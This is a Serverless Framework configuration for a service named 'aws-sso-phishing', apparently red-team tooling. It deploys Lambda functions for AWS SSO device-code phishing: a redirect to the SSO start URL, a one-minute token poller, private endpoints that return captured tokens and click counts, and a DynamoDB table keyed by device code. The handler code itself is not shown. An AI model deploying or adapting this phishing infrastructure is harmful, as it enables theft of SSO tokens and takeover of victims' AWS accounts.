# Welcome to Serverless!
#
# This file is the main config file for your service.
# It's very minimal at this point and uses default values.
# You can always add more config options for more control.
# We've included some commented out config examples here.
# Just uncomment any of them to get that config option.
#
# For full config options, check the docs:
#    docs.serverless.com
#
# Happy Coding!

service: aws-sso-phishing
# app and org for use with dashboard.serverless.com
app: aws-sso-phishing
#org: your-org-name

# You can pin your service to only deploy with a specific Serverless version
# Check out our docs for more details
frameworkVersion: '2'

provider:
  name: aws
  runtime: python3.8
  lambdaHashingVersion: 20201221
  apiGateway:
    apiKeys:
      - apiKey

  iam:
    role:
      statements:
        - Effect: "Allow"
          Action:
            - "dynamodb:PutItem"
            - "dynamodb:GetItem"
            - "dynamodb:Scan"
          Resource:
            - "*"
custom: 
  accountId: ${file(./aws.js):getAccountId}
  ssoRegion: ${file(./config.js):ssoRegion}
  ssoUrl: ${file(./config.js):ssoUrl}
                              
package:
  individually: true

plugins:
  - serverless-plugin-scripts

functions:

  poller:
    handler: functions/poller/handler.main
    environment:
      REGION: "us-east-1"
    package:
      exclude:
        - ./**
      include:
        - functions/poller/handler.py
    events:
          - schedule:
              rate: rate(1 minute)
              enabled: true

  urlRedirect:
    handler: functions/urlRedirect/handler.main
    environment:
      START_URL: ${self:custom.ssoUrl}
      REGION: ${self:custom.ssoRegion}
    package:
      exclude:
        - ./**
      include:
        - functions/urlRedirect/handler.py
    events:
      - http: get /


  getTokens:
    handler: functions/getTokens/handler.main
    package:
      exclude:
        - ./**
      include:
        - functions/getTokens/handler.py
    events:
      - http:
          path: getTokens
          method: get
          private: true

  getClicks:
    handler: functions/getClicks/handler.main
    package:
      exclude:
        - ./**
      include:
        - functions/getClicks/handler.py
    events:
      - http:
          path: getClicks
          method: get
          private: true



resources: # CloudFormation template syntax from here on.
  Resources:

    # Create DynamoDB
    usersTable:
      Type: AWS::DynamoDB::Table
      Properties:
        TableName: sessionTable
        AttributeDefinitions:
          - AttributeName: deviceCode
            AttributeType: S
        KeySchema:
          - AttributeName: deviceCode
            KeyType: HASH
        ProvisionedThroughput:
          ReadCapacityUnits: 1
          WriteCapacityUnits: 1



